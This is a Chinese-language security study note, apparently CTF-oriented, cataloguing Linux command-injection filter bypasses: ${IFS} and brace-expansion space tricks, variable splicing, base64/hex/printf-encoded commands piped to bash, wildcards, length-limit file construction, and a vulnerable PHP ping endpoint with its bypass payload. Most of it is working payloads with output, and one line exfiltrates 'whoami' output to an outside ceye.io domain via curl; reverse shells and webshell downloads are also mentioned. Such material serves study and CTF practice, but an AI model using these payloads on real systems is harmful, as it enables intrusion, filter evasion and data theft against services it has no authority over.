---
title: "网安笔记 - 知识补充 - Linux 绕过"
category: "网安笔记"
date: 2025-11-01
published: 2025-11-01
author: "Rin"
---

## 1、绕过过滤字符

### 1.1空格绕过

<1>`${IFS}`，Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符（internal field separator）。IFS环境变量定义了bash shell用户字段分隔符的一系列字符。默认情况下，bash shell会将下面的字符当做字段分隔符：空格、制表符、换行符。

<2>`${IFS}$9`，#`$9`可改成`$`加其他数字。 

<3>`{cat,flag.php}`，用`,`实现了空格；指令中的`{}`通配符，shell会先把`{}`的内容按照解释方式翻译成一个或多个参数，再执行该含有多参数的指令。在Linux bash中可以使用`{OS_COMMAND,ARGUMENT}`来执行系统命令，如`{mv,文件1，文件2}`。

<4>`<`，输入重定向，将一个文件的内容作为命令的输入。

<5>`<>`，重定向符

<6>`%20`，space

<7>`%09`，tab

<8>$IFS$9 //$1 改成 $+其他数字也行

<9>$IFS

<10>IFS
```bash
[root@localhost home]#cat${IFS}flag.php
12345678

[root@localhost home]# cat${IFS}$9flag.php
12345678

[root@localhost home]# {cat,flag.php}
12345678

[root@localhost home]# cat<flag.php
12345678

[root@localhost home]# cat<>flag.php
12345678
```

### 1.2黑名单绕过

### 1.2.1拼接变量

黑名单中有flag，通过拼接变量绕过

```text
[root@localhost home]# a=g;cat fla$a.php
12345678
[root@localhost home]# a=fl;b=ag;cat $a$b.php
12345678
```

### 1.2.2编码绕过

<1>base64编码

[https://the-x.cn/encodings/Base64.aspx](https://link.zhihu.com/?target=https%3A//the-x.cn/encodings/Base64.aspx)

```text
cat flag.php => Y2F0IGZsYWcucGhw
  
[root@localhost home]# `echo "Y2F0IGZsYWcucGhw"|base64 -d`
12345678

[root@localhost home]# $(echo "Y2F0IGZsYWcucGhw"|base64 -d)
12345678

[root@localhost home]# echo "Y2F0IGZsYWcucGhw"|base64 -d|bash
12345678

[root@localhost home]# echo "Y2F0IGZsYWcucGhw"|base64 -d|sh
12345678
```

<2>[hex编码](https://zhida.zhihu.com/search?content_id=237577612&content_type=Article&match_order=1&q=hex%E7%BC%96%E7%A0%81&zhida_source=entity)

[https://the-x.cn/encodings/Hex.aspx](https://link.zhihu.com/?target=https%3A//the-x.cn/encodings/Hex.aspx)

```text
cat flag.php =>0x63,0x61,0x74,0x20,0x66,0x6C,0x61,0x67,0x2E,0x70,0x68,0x70 =>63617420666c61672e706870
#xxd: 二进制显示和处理文件工具,cat: 以文本方式ASCII显示文件
#-r参数：逆向转换。将16进制字符串表示转为实际的数
#-ps参数：以 postscript的连续16进制转储输出，也叫做纯16进制转储。
#-r -p将纯十六进制转储的反向输出打印为了ASCII格式。
[root@localhost home]# `echo "63617420666c61672e706870"|xxd -r -p`
12345678
  
[root@localhost home]# $(echo "63617420666c61672e706870"|xxd -r -p)
12345678
  
[root@localhost home]# echo "63617420666c61672e706870"|xxd -r -p|bash
12345678
  
[root@localhost home]# echo "63617420666c61672e706870"|xxd -r -p|sh
12345678
```

<3>[shellcode编码](https://zhida.zhihu.com/search?content_id=237577612&content_type=Article&match_order=1&q=shellcode%E7%BC%96%E7%A0%81&zhida_source=entity)

```text
cat flag.php => \x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70
  
[root@localhost home]# {printf,"\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70"}|bash
12345678
  
[root@localhost home]# `{printf,"\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70"}`
12345678
  
[root@localhost home]# $(printf "\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70")
12345678
```

<4>利用已有资源

如：从已有的文件或者环境变量中获得相应的字符

```text
[root@localhost home]# echo ${PATH}
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin
[root@localhost home]#
[root@localhost home]# echo ${PATH:6:1}
o
[root@localhost home]# echo ${PATH:6:2}
oc
[root@localhost home]# echo ${PATH:1:2}
us
[root@localhost home]# echo ${PATH:0:2}
/u
[root@localhost home]# 
[root@localhost home]# c${PATH:8:1}t flag.php
12345678
```

<5>单引号和双引号

```text
[root@localhost home]# cat fl''ag.php
12345678
[root@localhost home]# cat fl'a'g.php
12345678
[root@localhost home]# cat f""lag.php
12345678
[root@localhost home]# cat f"l"ag.php
12345678
[root@localhost home]# c""at fl'a'g.php
12345678
```

<6>反斜杠绕过

```text
[root@localhost home]# cat f\l\ag.php
12345678
[root@localhost home]# ca\t f\lag.php
12345678
```

<7>shell特殊变量

```text
$1到$9、$@和$*等

[root@localhost home]# cat fl$1ag.php
12345678
[root@localhost home]# cat fl$2ag.php
12345678
[root@localhost home]# cat fl$@ag.php
12345678
[root@localhost home]# cat fl$*ag.php
12345678
```

### 1.3文件读取绕过

文件读取，最常用的就是cat命令。如果cat被过滤，可以使用下面命令替代：

```text
more:一页一页的显示档案内容
less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页
head:查看头几行
tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
tail:查看尾几行
nl：显示的时候，顺便输出行号
od:以二进制的方式读取档案内容，不加选项默认输出八进制，带 -c 参数则输出字符串内容
vi:一种编辑器，这个也可以查看
vim:一种编辑器，这个也可以查看
sort:可以查看
uniq:可以查看
file -f:报错出具体内容
```

### 1.4[通配符绕过](https://zhida.zhihu.com/search?content_id=237577612&content_type=Article&match_order=1&q=%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87&zhida_source=entity)

通配符含义介绍：

[https://www.secpulse.com/archives/96374.html](https://link.zhihu.com/?target=https%3A//www.secpulse.com/archives/96374.html)

```text
/???/[:lower:]s =>/bin/ls
[root@localhost home]# /???/[:lower:]s
flag.php  pci
[root@localhost home]# cat f*
12345678
[root@localhost home]# /???/?at flag.php
12345678
[root@localhost home]# /???/?at ????????
12345678
[root@localhost home]# /???/?[a][t] ????????
12345678
[root@localhost home]# /???/?[a][t] ?''?''?''?''?''?''?''?''
12345678
[root@localhost home]# /???/?[a]''[t] ?''?''?''?''?''?''?''?''
12345678
```

### 1.5内敛执行绕过

内敛，就是将`` `命令` ``或`$(命令)`内命令的输出作为输入执行

```text
[root@localhost home]# cat `ls`
12345678
cat: pci: 是一个目录

[root@localhost home]# cat $(ls)
12345678
cat: pci: 是一个目录
```

### 1.6长度限制绕过(文件构造绕过)

通常利用ls -t、>、>>和换行符\绕过长度限制

使用ls -t命令，可以将文件名按照时间顺序排列出来(后创建的排在前面)

使用>，可以将命令结果存入文件中

使用>>，可以将字符串添加到文件内容末尾，不会覆盖原内容

使用换行符\，可以将一条命令写在多行

```text
linux下可以用 1>a创建文件名为a的空文件
ls -t>test则会将目录按时间排序后写进test文件中
sh命令可以从一个文件中读取命令来执行
```

创建文件名可以连成要执行命令的空文件

```text
[root@localhost test]# ls
flag.php
[root@localhost test]# >"php"
[root@localhost test]# >"ag.\\"
[root@localhost test]# >"fl\\"
[root@localhost test]# >"t \\"
[root@localhost test]# >"ca\\"
[root@localhost test]# 
用2个反斜杠的原因：用前1个反斜杠转义后1个反斜杠
```

执行`ls -t>getflag`将目录下的文件名按时间排序后写进getflag文件里

```text
[root@localhost test]# ls -t>getflag
[root@localhost test]# ls -t
getflag  ca\  t \  fl\  ag.\  php  flag.php
[root@localhost test]#
[root@localhost test]# cat getflag
getflag
ca\
t \
fl\
ag.\
php
flag.php
```

执行`sh getflag`命令，从getflag文件中读取命令来执行

```text
[root@localhost test]# sh getflag
getflag:行1: getflag: 未找到命令
12345 you get it
getflag:行7: flag.php: 未找到命令
```

另外，长度限制绕过也可用于反弹shell命令和`wget 网址 -O webshell.php`命令

## 2、[命令盲注](https://zhida.zhihu.com/search?content_id=237577612&content_type=Article&match_order=1&q=%E5%91%BD%E4%BB%A4%E7%9B%B2%E6%B3%A8&zhida_source=entity)

### 2.1暴力查询

服务器未联网，无回显，无法利用自己总结的无回显命令执行，无写入权限和无法getshell等情况下，可以通过枚举/二分查找暴力查询flag。

### 2.2带外盲注

适用于页面无回显的情况。

例如把whoami执行的结果输出到ceye网站上，`ff34r0.ceye.io`为自己的域名地址。

ceye网站：[https://sso.telnet404.com/cas/login](https://link.zhihu.com/?target=https%3A//sso.telnet404.com/cas/login)

```text
127.0.0.1&curl `whoami`.ff34r0.ceye.io
```

### 2.3 sleep()妙用

通过sleep()函数判断我们的命令是否执行成功。

```text
ls;sleep(5);
```

### 2.4 >/dev/null 2>&1类无回显

代码中插入了`>/dev/null 2>&1`，`>/dev/null 2>&1`的作用就是不回显。利用分隔符`||`即可绕过，分隔符的含义是前一条命令执行失败了才会执行后一条命令。

```text
ls || >/dev/null 2>&1
```

## 3、无字母数字webshell

`.`或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则`. file`的意思就是用bash执行file文件中的命令。用. file执行文件，是不需要file有x权限的。

```text
[root@localhost home]# cat flag.php
12345678
[root@localhost home]
[root@localhost home]# cat a.txt
cat flag.php
[root@localhost home]
[root@localhost home]# . /home/a.txt
12345678
```

## 4、无字母数字RCE

利用异或、或、取反等操作进行绕过


## 5、 赋值绕过
```php
<?php
 if(isset($_GET['ip'])){
	 $ip = $_GET['ip'];
 if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
			print_r($match);
			print($ip);
			echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
			die("fxck your symbol!");
		}
		else if(preg_match("/ /", $ip)){
			die("fxck your space!");
		}
		else if(preg_match("/bash/", $ip)){
			die("fxck your bash!");
		}
		else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
			die("fxck your flag!");
		}
		$a = shell_exec("ping -c 4 ".$ip);
		echo "

";
		print_r($a);
	}

	?>
```
这串代码
```php
preg_match("/.*f.*l.*a.*g.*/", $ip)
```
的意思是 不能让flag这四个字符放在一起

那么我们可以这样组合:
```bash
ping 127.0.0.1;q=g;cat$IFS$9fla$q.php
```